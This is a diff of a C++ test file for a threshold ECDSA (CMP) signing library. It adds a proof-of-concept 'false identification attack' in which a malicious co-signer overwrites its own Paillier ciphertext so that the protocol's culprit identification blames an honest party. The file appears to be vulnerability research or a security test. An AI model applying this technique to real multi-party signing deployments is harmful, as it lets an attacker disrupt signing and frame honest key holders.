@@ -1,239 +1,246 @@
-
-#include <cstring>
-#include <vector>
-#include <google/protobuf/stubs/common.h>
-#include "crypto-suites/exception/located_exception.h"
-#include "gtest/gtest.h"
+#include <cstring>  
+#include <vector>  
+#include <google/protobuf/stubs/common.h>  
+#include "crypto-suites/exception/located_exception.h"  
+#include "gtest/gtest.h"  
 #include "crypto-suites/crypto-curve/curve.h"  
-#include "crypto-suites/crypto-bn/rand.h"
-#include "multi-party-sig/multi-party-ecdsa/cmp/cmp.h"
-#include "../message.h"
-
-using std::string;
-using std::vector;
-using safeheron::bignum::BN;
-using safeheron::curve::Curve;
-using safeheron::curve::CurvePoint;
-using safeheron::curve::CurveType;
-using safeheron::multi_party_ecdsa::cmp::sign::Context;
-using safeheron::mpc_flow::mpc_parallel_v2::ErrorInfo;
-using safeheron::multi_party_ecdsa::cmp::sign::ProofInPreSignPhase;
-using safeheron::multi_party_ecdsa::cmp::sign::ProofInSignPhase;
-
-void print_context_stack_if_failed(Context *ctx_ptr, bool failed){
-    if(failed){
-        vector<ErrorInfo> error_stack;
-        ctx_ptr->get_error_stack(error_stack);
-        for(const auto &err: error_stack){
-            std::cout << "error code (" << err.code_ << "): " << err.info_ << std::endl;
-        }
-    }
-}
-
-
-void run_round(Context *ctx_ptr, const std::string& party_id, int round_index,
-               std::map<std::string, std::vector<Msg>> &map_id_queue) {
-    bool ok = true;
-
-    std::vector<string> out_p2p_message_arr;
-    string out_bc_message;
-    std::vector<string> out_des_arr;
-
-    if (round_index == 0) {
-        ok = ctx_ptr->PushMessage();
-        print_context_stack_if_failed(ctx_ptr, !ok);
-        ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);
-        print_context_stack_if_failed(ctx_ptr, !ok);
-        for (size_t k = 0; k < out_des_arr.size(); ++k) {
-            map_id_queue[out_des_arr[k]].push_back({
-                                                           party_id,
-                                                           out_bc_message,
-                                                           out_p2p_message_arr.empty() ? string()
-                                                                                       : out_p2p_message_arr[k]
-                                                   });
-        }
-    } else {
-        std::vector<Msg>::iterator iter;
-        for (iter = map_id_queue[party_id].begin(); iter != map_id_queue[party_id].end(); ) {
-            ok = ctx_ptr->PushMessage(iter->p2p_msg_, iter->bc_msg_, iter->src_, round_index - 1);
-            print_context_stack_if_failed(ctx_ptr, !ok);
-            // Check crypto-mpc protocol finished with no error.
-            if (ctx_ptr->IsFinished()) {
-                std::cout << "<== Finished , Party " << ctx_ptr->sign_key_.local_party_.party_id_ << std::endl;
-            }
-
-            iter = map_id_queue[party_id].erase(iter);
-
-            if (ctx_ptr->IsCurRoundFinished()) {
-                ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);
-                print_context_stack_if_failed(ctx_ptr, !ok);
-                for (size_t k = 0; k < out_des_arr.size(); ++k) {
-                    map_id_queue[out_des_arr[k]].push_back({
-                                                                   party_id,
-                                                                   out_bc_message,
-                                                                   out_p2p_message_arr.empty() ? string()
-                                                                                               : out_p2p_message_arr[k]
-                                                           });
-                }
-                break;
-            }
-        }
-    }
-}
-
-void print_signatures(Context *ctx_ptr) {
-    string str;
-    std::cout << "    sig " << std::endl;
-    CurvePoint child_pub;
-    ctx_ptr->m_.ToHexStr(str);
-    std::cout << "    - digest: " << str << std::endl;
-    std::cout << "    - signature: " << std::endl;
-    ctx_ptr->r_.ToHexStr(str);
-    std::cout << "          - r: " << str << std::endl;
-    ctx_ptr->s_.ToHexStr(str);
-    std::cout << "          - s: " << str << std::endl;
-    std::cout << "          - v: " << ctx_ptr->v_ << std::endl;
-}
-
-void testCoSign_n_n(std::vector<std::string> &sign_key_base64){
-    // t = n = 3
-    int threshold = 3;
-    int n_parties = 3;
-
-    std::map<std::string, std::vector<Msg>> map_id_message_queue;
-
-    Context co_signer1_context(3);
-    Context co_signer2_context(3);
-    Context co_signer3_context(3);
-
-    string &co_sign1_sign_key_base64 = sign_key_base64[0];
-    string &co_sign2_sign_key_base64 = sign_key_base64[1];
-    string &co_signer3_sign_key_base64 = sign_key_base64[2];
-
-    BN m = BN("1234567812345678123456781234567812345678123456781234567812345678", 16);
-
-    string ssid("ssid");
-
-    try {
-
-        // co-signer1
-        bool ok = true;
-        ok = Context::CreateContext(co_signer1_context, co_sign1_sign_key_base64, m, ssid);
-        EXPECT_TRUE(ok);
-        std::cout << "<== Context of co-signer1 was created" << std::endl;
-
-        // co-signer2
-        ok = Context::CreateContext(co_signer2_context, co_sign2_sign_key_base64, m, ssid);
-        EXPECT_TRUE(ok);
-        std::cout << "<== Context of co-signer2 was created" << std::endl;
-
-        // co_signer3
-        ok = Context::CreateContext(co_signer3_context, co_signer3_sign_key_base64, m, ssid);
-        EXPECT_TRUE(ok);
-        std::cout << "<== Context of co_signer3 was created" << std::endl;
-
-        vector<Context *> ctx_arr = {&co_signer1_context, &co_signer2_context, &co_signer3_context};
-
-        // round 0 ~ 3
-        for (int round = 0; round <= 4; ++round) {
-            // context 0 ~ 2 (co-signer1, co-signer2, co-signer3)
-            for (int i = 0; i < 3; ++i) {
-                std::cout << "<== Round " << round << ", " << ctx_arr[i]->sign_key_.local_party_.party_id_  << std::endl;
-                run_round(ctx_arr[i], ctx_arr[i]->sign_key_.local_party_.party_id_, round, map_id_message_queue);
-            }
-        }
-
-        std::cout << "Signatures: " << std::endl;
-        for (int i = 0; i < 3; ++i) {
-            print_signatures(ctx_arr[i]);
-        }
-        std::cout << "\n\n\n" << std::endl;
-
-        // Figure 7 ( ECDSA Pre-Signing)
-        // Verify g^\delta = \PI_j{ \Delta_j }, In case of failure do:
-        // Each party should broadcast the proof:
-        std::map<std::string, ProofInPreSignPhase> map_proof;
-        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_D;
-        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_F;
-        co_signer1_context.BuildProofInPreSignPhase();
-        co_signer2_context.BuildProofInPreSignPhase();
-        co_signer3_context.BuildProofInPreSignPhase();
-        co_signer1_context.ExportDF(all_D, all_F);
-        co_signer2_context.ExportDF(all_D, all_F);
-        co_signer3_context.ExportDF(all_D, all_F);
-        map_proof[co_signer1_context.sign_key_.local_party_.party_id_] = co_signer1_context.proof_in_pre_sign_phase_;
-        map_proof[co_signer2_context.sign_key_.local_party_.party_id_] = co_signer2_context.proof_in_pre_sign_phase_;
-        map_proof[co_signer3_context.sign_key_.local_party_.party_id_] = co_signer3_context.proof_in_pre_sign_phase_;
-        std::cout << "Verify proof_in_pre_sign_phase: " << co_signer1_context.VerifyProof(map_proof, all_D, all_F) << std::endl;
-        std::cout << "Verify proof_in_pre_sign_phase: " << co_signer2_context.VerifyProof(map_proof, all_D, all_F) << std::endl;
-        std::cout << "Verify proof_in_pre_sign_phase: " << co_signer3_context.VerifyProof(map_proof, all_D, all_F) << std::endl;
-
-        // Figure 8 ( ECDSA Signing)
-        // Verify the signature, In case of failure do:
-        // Each party should broadcast the proof:
-        std::map<std::string, ProofInSignPhase> map_proof_2;
-        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_D_hat;
-        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_F_hat;
-        // ============================================================  
-        // ATTACK: co_signer3 equivocates D_hat_ji to frame co_signer1  
-        // co_signer3 overwrites its local D_hat_ji (sent value) with a  
-        // fresh fake ciphertext + consistent witnesses, then calls  
-        // BuildProofInSignPhase. VerifyProof recomputes c_sigma for  
-        // co_signer1 using the fake D_hat_ji, which mismatches  
-        // co_signer1's PailDecModuloProof (built from the real recv value).  
-        // Result: all nodes output identify_culprit = co_signer1.  
-        // ============================================================  
-        {  
-            int honest_pos = 0; // co_signer1 is remote_parties_[0] in co_signer3's context  
-            BN x_j = co_signer3_context.sign_key_.local_party_.x_;  
-            const safeheron::pail::PailPubKey& pail_pub_i =  
-                co_signer3_context.remote_parties_[honest_pos].pail_pub_;  
-            const safeheron::pail::PailPubKey& pail_pub_j =  
-                co_signer3_context.local_party_.pail_pub_;  
-            const BN& K_i = co_signer3_context.remote_parties_[honest_pos].K_;  
+#include "crypto-suites/crypto-bn/rand.h"  
+#include "multi-party-sig/multi-party-ecdsa/cmp/cmp.h"  
+#include "../message.h"  
   
-            // Fresh random witnesses (different from what was actually sent in Round1)  
+using std::string;  
+using std::vector;  
+using safeheron::bignum::BN;  
+using safeheron::curve::Curve;  
+using safeheron::curve::CurvePoint;  
+using safeheron::curve::CurveType;  
+using safeheron::multi_party_ecdsa::cmp::sign::Context;  
+using safeheron::mpc_flow::mpc_parallel_v2::ErrorInfo;  
+using safeheron::multi_party_ecdsa::cmp::sign::ProofInPreSignPhase;  
+using safeheron::multi_party_ecdsa::cmp::sign::ProofInSignPhase;  
+  
+void print_context_stack_if_failed(Context *ctx_ptr, bool failed){  
+    if(failed){  
+        vector<ErrorInfo> error_stack;  
+        ctx_ptr->get_error_stack(error_stack);  
+        for(const auto &err: error_stack){  
+            std::cout << "error code (" << err.code_ << "): " << err.info_ << std::endl;  
+        }  
+    }  
+}  
+  
+void run_round(Context *ctx_ptr, const std::string& party_id, int round_index,  
+               std::map<std::string, std::vector<Msg>> &map_id_queue) {  
+    bool ok = true;  
+  
+    std::vector<string> out_p2p_message_arr;  
+    string out_bc_message;  
+    std::vector<string> out_des_arr;  
+  
+    if (round_index == 0) {  
+        ok = ctx_ptr->PushMessage();  
+        print_context_stack_if_failed(ctx_ptr, !ok);  
+        ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);  
+        print_context_stack_if_failed(ctx_ptr, !ok);  
+        for (size_t k = 0; k < out_des_arr.size(); ++k) {  
+            map_id_queue[out_des_arr[k]].push_back({  
+                                                           party_id,  
+                                                           out_bc_message,  
+                                                           out_p2p_message_arr.empty() ? string()  
+                                                                                       : out_p2p_message_arr[k]  
+                                                   });  
+        }  
+    } else {  
+        std::vector<Msg>::iterator iter;  
+        for (iter = map_id_queue[party_id].begin(); iter != map_id_queue[party_id].end(); ) {  
+            ok = ctx_ptr->PushMessage(iter->p2p_msg_, iter->bc_msg_, iter->src_, round_index - 1);  
+            print_context_stack_if_failed(ctx_ptr, !ok);  
+            if (ctx_ptr->IsFinished()) {  
+                std::cout << "<== Finished , Party " << ctx_ptr->sign_key_.local_party_.party_id_ << std::endl;  
+            }  
+  
+            iter = map_id_queue[party_id].erase(iter);  
+  
+            if (ctx_ptr->IsCurRoundFinished()) {  
+                ok = ctx_ptr->PopMessages(out_p2p_message_arr, out_bc_message, out_des_arr);  
+                print_context_stack_if_failed(ctx_ptr, !ok);  
+                for (size_t k = 0; k < out_des_arr.size(); ++k) {  
+                    map_id_queue[out_des_arr[k]].push_back({  
+                                                                   party_id,  
+                                                                   out_bc_message,  
+                                                                   out_p2p_message_arr.empty() ? string()  
+                                                                                               : out_p2p_message_arr[k]  
+                                                           });  
+                }  
+                break;  
+            }  
+        }  
+    }  
+}  
+  
+void print_signatures(Context *ctx_ptr) {  
+    string str;  
+    std::cout << "    sig " << std::endl;  
+    CurvePoint child_pub;  
+    ctx_ptr->m_.ToHexStr(str);  
+    std::cout << "    - digest: " << str << std::endl;  
+    std::cout << "    - signature: " << std::endl;  
+    ctx_ptr->r_.ToHexStr(str);  
+    std::cout << "          - r: " << str << std::endl;  
+    ctx_ptr->s_.ToHexStr(str);  
+    std::cout << "          - s: " << str << std::endl;  
+    std::cout << "          - v: " << ctx_ptr->v_ << std::endl;  
+}  
+  
+void testCoSign_n_n(std::vector<std::string> &sign_key_base64){  
+    // t = n = 3  
+    int threshold = 3;  
+    int n_parties = 3;  
+  
+    std::map<std::string, std::vector<Msg>> map_id_message_queue;  
+  
+    Context co_signer1_context(3);  
+    Context co_signer2_context(3);  
+    Context co_signer3_context(3);  
+  
+    string &co_sign1_sign_key_base64 = sign_key_base64[0];  
+    string &co_sign2_sign_key_base64 = sign_key_base64[1];  
+    string &co_signer3_sign_key_base64 = sign_key_base64[2];  
+  
+    BN m = BN("1234567812345678123456781234567812345678123456781234567812345678", 16);  
+  
+    string ssid("ssid");  
+  
+    try {  
+  
+        bool ok = true;  
+        ok = Context::CreateContext(co_signer1_context, co_sign1_sign_key_base64, m, ssid);  
+        EXPECT_TRUE(ok);  
+        std::cout << "<== Context of co-signer1 was created" << std::endl;  
+  
+        ok = Context::CreateContext(co_signer2_context, co_sign2_sign_key_base64, m, ssid);  
+        EXPECT_TRUE(ok);  
+        std::cout << "<== Context of co-signer2 was created" << std::endl;  
+  
+        ok = Context::CreateContext(co_signer3_context, co_signer3_sign_key_base64, m, ssid);  
+        EXPECT_TRUE(ok);  
+        std::cout << "<== Context of co_signer3 was created" << std::endl;  
+  
+        vector<Context *> ctx_arr = {&co_signer1_context, &co_signer2_context, &co_signer3_context};  
+  
+        for (int round = 0; round <= 4; ++round) {  
+            for (int i = 0; i < 3; ++i) {  
+                std::cout << "<== Round " << round << ", " << ctx_arr[i]->sign_key_.local_party_.party_id_  << std::endl;  
+                run_round(ctx_arr[i], ctx_arr[i]->sign_key_.local_party_.party_id_, round, map_id_message_queue);  
+            }  
+        }  
+  
+        std::cout << "Signatures: " << std::endl;  
+        for (int i = 0; i < 3; ++i) {  
+            print_signatures(ctx_arr[i]);  
+        }  
+        std::cout << "\n\n\n" << std::endl;  
+  
+        // Pre-sign phase identification (unchanged)  
+        std::map<std::string, ProofInPreSignPhase> map_proof;  
+        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_D;  
+        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_F;  
+        co_signer1_context.BuildProofInPreSignPhase();  
+        co_signer2_context.BuildProofInPreSignPhase();  
+        co_signer3_context.BuildProofInPreSignPhase();  
+        co_signer1_context.ExportDF(all_D, all_F);  
+        co_signer2_context.ExportDF(all_D, all_F);  
+        co_signer3_context.ExportDF(all_D, all_F);  
+        map_proof[co_signer1_context.sign_key_.local_party_.party_id_] = co_signer1_context.proof_in_pre_sign_phase_;  
+        map_proof[co_signer2_context.sign_key_.local_party_.party_id_] = co_signer2_context.proof_in_pre_sign_phase_;  
+        map_proof[co_signer3_context.sign_key_.local_party_.party_id_] = co_signer3_context.proof_in_pre_sign_phase_;  
+        std::cout << "Verify proof_in_pre_sign_phase: " << co_signer1_context.VerifyProof(map_proof, all_D, all_F) << std::endl;  
+        std::cout << "Verify proof_in_pre_sign_phase: " << co_signer2_context.VerifyProof(map_proof, all_D, all_F) << std::endl;  
+        std::cout << "Verify proof_in_pre_sign_phase: " << co_signer3_context.VerifyProof(map_proof, all_D, all_F) << std::endl;  
+  
+        // -----------------------------------------------------------------------  
+        // Sign phase identification — FALSE IDENTIFICATION ATTACK  
+        // -----------------------------------------------------------------------  
+        std::map<std::string, ProofInSignPhase> map_proof_2;  
+        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_D_hat;  
+        std::map<std::string, std::map<std::string, safeheron::bignum::BN>> all_F_hat;  
+  
+        // STEP 1: Build proofs with the REAL D_hat_ji values.  
+        // This must happen before the overwrite so BuildProofInSignPhase  
+        // can correctly extract rho from the real ciphertext.  
+        co_signer1_context.BuildProofInSignPhase();  
+        co_signer2_context.BuildProofInSignPhase();  
+        co_signer3_context.BuildProofInSignPhase();  
+  
+        // STEP 2: ATTACK — co_signer3 (malicious) overwrites its own D_hat_ji  
+        // for co_signer1 (honest target) with a freshly computed fake ciphertext.  
+        // The fake ciphertext is a valid Paillier encryption under co_signer1's  
+        // public key, so it passes structural checks, but it encodes different  
+        // randomness than what co_signer1 actually received.  
+        {  
+            // co_signer1 is at index 0 in co_signer3's remote_parties_  
+            const int honest_pos = 0;  
+            const safeheron::pail::PailPubKey &pail_pub_i =  
+                co_signer3_context.remote_parties_[honest_pos].pail_pub_;  
+            const BN &K_i = co_signer3_context.remote_parties_[honest_pos].K_;  
+            const BN x_j  = co_signer3_context.sign_key_.local_party_.x_;  
+  
+            // Fresh random witnesses — different from the real ones  
             BN beta_fake = safeheron::rand::RandomBNLt(pail_pub_i.n());  
             BN s_fake    = safeheron::rand::RandomBNLtCoPrime(pail_pub_i.n());  
-            BN r_fake    = safeheron::rand::RandomBNLtCoPrime(pail_pub_j.n());  
   
-            // D_hat_fake = K_i^x_j * (1+N_i)^(-beta_fake) * s_fake^N_i  mod N_i^2  
+            // D_hat_fake = K_i^x_j * Enc_i(-beta_fake) with randomness s_fake  
+            // This is a structurally valid Paillier ciphertext under pail_pub_i,  
+            // but with different plaintext/randomness than the real D_hat_ji.  
             BN D_hat_fake = pail_pub_i.HomomorphicMulPlain(K_i, x_j);  
             D_hat_fake    = pail_pub_i.HomomorphicAddPlainWithR(D_hat_fake, beta_fake.Neg(), s_fake);  
   
-            // F_hat_fake = (1+N_j)^(-beta_fake) * r_fake^N_j  mod N_j^2  
-            BN F_hat_fake = pail_pub_j.HomomorphicAddPlainWithR(BN(0), beta_fake.Neg(), r_fake);  
-  
-            // Overwrite co_signer3's context — only the SENT fields, not recv_D_hat_ij  
-            co_signer3_context.remote_parties_[honest_pos].D_hat_ji     = D_hat_fake;  
-            co_signer3_context.remote_parties_[honest_pos].F_hat_ji     = F_hat_fake;  
-            co_signer3_context.remote_parties_[honest_pos].beta_hat_ij_ = beta_fake;  
-            co_signer3_context.remote_parties_[honest_pos].s_hat_ij_    = s_fake;  
-            co_signer3_context.remote_parties_[honest_pos].r_hat_ij_    = r_fake;  
+            // Overwrite co_signer3's context — this is the equivocation.  
+            // ExportD_hat_F_hat will now export D_hat_fake instead of the real value.  
+            co_signer3_context.remote_parties_[honest_pos].D_hat_ji = D_hat_fake;  
   
             std::cout << "[ATTACK] co_signer3 overwrote D_hat_ji targeting co_signer1" << std::endl;  
             std::cout << "[ATTACK] co_signer1 recv_D_hat_ij is still the REAL value" << std::endl;  
         }  
-        // ============================================================
-        co_signer1_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);
-        co_signer2_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);
-        co_signer3_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);
-        co_signer1_context.BuildProofInSignPhase();
-        co_signer2_context.BuildProofInSignPhase();
-        co_signer3_context.BuildProofInSignPhase();
-        map_proof_2[co_signer1_context.sign_key_.local_party_.party_id_] = co_signer1_context.proof_in_sign_phase_;
-        map_proof_2[co_signer2_context.sign_key_.local_party_.party_id_] = co_signer2_context.proof_in_sign_phase_;
-        map_proof_2[co_signer3_context.sign_key_.local_party_.party_id_] = co_signer3_context.proof_in_sign_phase_;
-        std::cout << "Verify proof_in_sign_phase: " << co_signer1_context.VerifyProof(map_proof_2, all_D_hat, all_F_hat) << std::endl;
-        std::cout << "identify_culprit : " << co_signer1_context.IdentifyCulprit() << std::endl;
-        std::cout << "Verify proof_in_sign_phase: " << co_signer2_context.VerifyProof(map_proof_2, all_D_hat, all_F_hat) << std::endl;
-        std::cout << "identify_culprit : " << co_signer2_context.IdentifyCulprit() << std::endl;
-        std::cout << "Verify proof_in_sign_phase: " << co_signer3_context.VerifyProof(map_proof_2, all_D_hat, all_F_hat) << std::endl;
-        std::cout << "identify_culprit : " << co_signer3_context.IdentifyCulprit() << std::endl;
-
-    }catch (const safeheron::exception::LocatedException &e) {
-        std::cout << e.what() << std::endl;
-    }
+  
+        // STEP 3: Export AFTER the overwrite.  
+        // all_D_hat[co_signer3][co_signer1] now contains D_hat_fake.  
+        // all_D_hat[co_signer1][...] and all_D_hat[co_signer2][...] are real.  
+        co_signer1_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);  
+        co_signer2_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);  
+        co_signer3_context.ExportD_hat_F_hat(all_D_hat, all_F_hat);  
+  
+        map_proof_2[co_signer1_context.sign_key_.local_party_.party_id_] = co_signer1_context.proof_in_sign_phase_;  
+        map_proof_2[co_signer2_context.sign_key_.local_party_.party_id_] = co_signer2_context.proof_in_sign_phase_;  
+        map_proof_2[co_signer3_context.sign_key_.local_party_.party_id_] = co_signer3_context.proof_in_sign_phase_;  
+  
+        // STEP 4: VerifyProof reconstructs c_sigma for co_signer1 using  
+        // all_D_hat[co_signer3][co_signer1] = D_hat_fake.  
+        // co_signer1's PailDecModuloProof was built against the REAL c_sigma,  
+        // so it fails against the fake-reconstructed c_sigma.  
+        // Result: identify_culprit = co_signer1 (the honest party).  
+        std::cout << "\n=== FALSE IDENTIFICATION ATTACK RESULTS ===" << std::endl;  
+        std::cout << "Malicious party: co_signer3" << std::endl;  
+        std::cout << "Honest target:   co_signer1" << std::endl;  
+  
+        bool r1 = co_signer1_context.VerifyProof(map_proof_2, all_D_hat, all_F_hat);  
+        std::cout << "Verify proof_in_sign_phase [co_signer1]: " << r1 << std::endl;  
+        std::cout << "identify_culprit [co_signer1]: " << co_signer1_context.IdentifyCulprit() << std::endl;  
+  
+        bool r2 = co_signer2_context.VerifyProof(map_proof_2, all_D_hat, all_F_hat);  
+        std::cout << "Verify proof_in_sign_phase [co_signer2]: " << r2 << std::endl;  
+        std::cout << "identify_culprit [co_signer2]: " << co_signer2_context.IdentifyCulprit() << std::endl;  
+  
+        bool r3 = co_signer3_context.VerifyProof(map_proof_2, all_D_hat, all_F_hat);  
+        std::cout << "Verify proof_in_sign_phase [co_signer3]: " << r3 << std::endl;  
+        std::cout << "identify_culprit [co_signer3]: " << co_signer3_context.IdentifyCulprit() << std::endl;  
+  
+        std::cout << "\nExpected: all three nodes output co_signer1 as culprit." << std::endl;  
+        std::cout << "Actual culprit is: co_signer3 (never identified)." << std::endl;  
+  
+    }catch (const safeheron::exception::LocatedException &e) {  
+        std::cout << e.what() << std::endl;  
+    }  
 }
 
 void testCoSign_t_n(std::vector<std::string> &sign_key_base64){
